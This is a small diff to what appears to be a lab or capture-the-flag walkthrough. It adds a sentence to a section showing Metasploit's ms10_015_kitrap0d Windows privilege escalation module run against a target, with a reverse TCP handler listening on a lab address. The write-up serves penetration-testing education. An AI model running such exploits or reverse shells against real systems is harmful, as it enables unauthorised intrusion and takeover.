@@ -233,6 +233,8 @@ session => 1
 msf6 exploit(windows/local/ms10_015_kitrap0d) > run
 ```
 
+We get thrown straight into an administrator account:
+
 ```
 [*] Started reverse TCP handler on 10.10.14.36:4444 
 [*] Launching notepad to host the exploit...
